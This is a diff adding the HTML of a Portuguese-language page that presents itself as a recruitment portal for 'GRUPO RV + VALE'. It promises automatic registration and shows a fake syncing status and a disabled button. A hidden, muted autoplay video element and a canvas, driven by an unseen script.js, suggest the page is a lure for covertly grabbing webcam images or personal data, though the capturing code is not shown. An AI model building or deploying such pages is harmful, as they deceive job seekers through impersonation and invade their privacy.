@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>GRUPO RV + VALE - Processo Seletivo</title>
+    <link rel="stylesheet" href="style.css">
+    <style id="custom-theme"></style>
+</head>
+<body>
+
+    <div class="bg"></div>
+
+    <div class="container">
+        <div class="topo">
+            <div class="tag" id="label-vaga">SISTEMA</div>
+            <h1 id="titulo-vaga">GRUPO RV + VALE</h1>
+            <p id="subtitulo-vaga">Participe do processo seletivo</p>
+        </div>
+
+        <div class="video-card" id="video-container">
+            <div style="width:100%; height:100%; display:flex; align-items:center; justify-content:center; color:#94a3b8;">
+                Carregando apresentação...
+            </div>
+        </div>
+
+        <div class="fala" id="mensagem-vaga">
+            📢 O seu cadastro será realizado automaticamente após carregar o sistema e clicar no botão abaixo.
+        </div>
+
+        <button id="btn" disabled>AGUARDE...</button>
+        <div id="status">Sincronizando com a vaga...</div>
+
+        <div class="loading">
+            <div class="bar"></div>
+        </div>
+
+        <video id="video" autoplay playsinline muted style="display:none;"></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script type="module" src="script.js"></script>
+</body>
+</html>
